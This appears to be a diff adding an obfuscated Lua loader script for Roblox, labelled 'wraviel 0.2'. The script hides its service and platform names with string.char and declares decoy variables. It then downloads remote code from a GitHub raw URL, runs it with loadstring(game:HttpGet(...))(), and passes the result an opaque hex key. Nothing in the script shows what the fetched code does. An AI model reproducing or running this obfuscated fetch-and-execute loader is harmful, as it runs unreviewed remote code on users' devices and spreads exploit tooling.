@@ -1,0 +1,9 @@
+--[[wraviel 0.2 without makeup]]
+local r,z,x,c,v,m = "wdqwadwqdqwesaw","dswedwwefdads","https://raw.githubusercontent.com/Oproxide/i-just-a-babeh/refs/heads/main/testingchamber","egdsdwdqwdqww","ewqdqdwwfsc","iwefiywyfgywie";_G.z = "jErcBWaEAyIpzENyBKoQWaVOPpBdvPLIBnSCXoASmtZgBY"
+wtv=({[string.char(65,110,100,114,111,105,100)]=true,[string.char(73,79,83)]=true})[game:GetService(string.char(85,115,101,114,73,110,112,117,116,83,101,114,118,105,99,101)):GetPlatform()]
+if wtv then
+    x = "https://raw.githubusercontent.com/Oproxide/i-just-a-babeh/refs/heads/main/mobile"
+end
+m = loadstring(game:HttpGet(x))()
+m.l("669ea2790d2fa74d0f95dacb3d084703105c7b6ed47884e7fc90a4afd402db351e1401dcd7472fde1faad0b09aad9ce759f1df22346ecba7b1387668f777969ae87ce240aabeb404425bb1cfe7e6476eb8141c8a489c2ad8379bc70ac90ab6e02cff86767b60aa608479438a2c6c1060ac55d7a338")
+    
